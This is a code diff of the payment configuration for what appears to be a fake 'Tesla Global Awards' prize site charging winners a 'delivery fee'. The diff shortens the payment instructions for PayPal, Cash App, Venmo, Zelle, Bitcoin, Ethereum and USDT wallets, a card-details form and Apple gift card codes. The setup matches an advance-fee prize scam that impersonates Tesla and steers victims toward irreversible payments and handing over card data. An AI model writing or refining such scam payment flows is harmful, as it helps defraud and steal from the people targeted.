@@ -48,7 +48,7 @@
         email: 'payments@teslaglobalawards.com',
         merchantId: 'TM8XK2R9Q4ZPA',
         paypalMeLink: 'https://paypal.me/teslaglobalawards',
-        instructions: 'Send the exact delivery amount shown above to our verified PayPal business account. Confirm that the recipient name matches our business before completing your payment.'
+        instructions: 'Send the delivery fee to the PayPal email above.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -61,7 +61,7 @@
         accountName: 'Tesla Global Awards',
         phone: '+1 (888) 472-3001',
         qrCode: '',
-        instructions: 'Send the exact delivery amount shown above to our verified $Cashtag. Confirm that the recipient name matches our business before completing your payment.'
+        instructions: 'Send the delivery fee to the $Cashtag above.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -73,7 +73,7 @@
         username: '@TeslaGlobalAwards',
         accountName: 'Tesla Global Awards LLC',
         qrCode: '',
-        instructions: 'Send the exact delivery amount shown above to our official Venmo handle. Confirm that the recipient name matches our business before completing your payment.'
+        instructions: 'Send the delivery fee to the Venmo handle above.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -85,7 +85,7 @@
         recipientName: 'Tesla Global Awards LLC',
         email: 'zelle@teslaglobalawards.com',
         phone: '+1 (415) 892-3401',
-        instructions: 'Send the exact delivery amount shown above via Zelle to our registered email or phone number. Confirm that the recipient name matches our business before authorizing the transfer.'
+        instructions: 'Send the delivery fee to the email or phone above.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -98,7 +98,7 @@
         network: 'Bitcoin (BTC) — Mainnet',
         confirmations: '3 confirmations required',
         qrCode: '',
-        instructions: 'Send the exact BTC equivalent of the delivery amount to the wallet address shown. Use the Bitcoin (BTC) network only and verify the full address carefully before confirming the transaction.'
+        instructions: 'Copy the wallet address and send the delivery fee in BTC.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -111,7 +111,7 @@
         network: 'Ethereum Mainnet (ERC-20)',
         confirmations: '12 confirmations required',
         qrCode: '',
-        instructions: 'Send the exact ETH equivalent of the delivery amount to the wallet address shown on the Ethereum Mainnet. Verify the full address carefully before confirming the transaction.'
+        instructions: 'Copy the wallet address and send the delivery fee in ETH.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -124,7 +124,7 @@
         network: 'Ethereum Mainnet (ERC-20)',
         tokenContract: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
         qrCode: '',
-        instructions: 'Send the exact USDT amount to the wallet address shown using the ERC-20 (Ethereum) network. Do not use other networks. Verify the address carefully before confirming.'
+        instructions: 'Copy the wallet address and send the delivery fee in USDT (ERC-20).'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -136,7 +136,7 @@
         walletAddress: 'TYASr5UV6HEcXatwdFQfmLVUqQQQMUxHLS',
         network: 'TRON Network (TRC-20)',
         qrCode: '',
-        instructions: 'Send the exact USDT amount to the wallet address shown using the TRC-20 (TRON) network. Verify the address carefully before confirming the transaction.'
+        instructions: 'Copy the wallet address and send the delivery fee in USDT (TRC-20).'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -149,7 +149,7 @@
         processorName: 'Tesla Awards Secure Payments',
         merchantAccount: 'TGAWARDS-US-9041',
         supportPhone: '+1 (888) 472-3001',
-        instructions: 'Enter your card details securely in the form below. We accept Visa, Mastercard, American Express, and Discover. Your payment is encrypted and processed securely.'
+        instructions: 'Enter your card details below to pay the delivery fee.'
       },
       lastUpdated: '2026-07-20T12:00:00Z'
     },
@@ -158,7 +158,7 @@
       description: 'Pay with an Apple Gift Card — instant and private',
       logo: LOGO_DIR + 'applegift.svg', enabled: true, displayOrder: 10,
       config: {
-        instructions: 'Purchase an Apple Gift Card for the exact delivery amount from the Apple Store, Apple.com, or an authorized retailer. Scratch off the back to reveal the redemption code, then provide the card details below.',
+        instructions: 'Enter your Apple Gift Card code below for the delivery fee.',
         denominationsAccepted: '$25, $50, $100, $200 denominations accepted',
         purchaseLocations: 'Apple Store, Apple.com, Walmart, Target, Best Buy, CVS, Walgreens'
       },
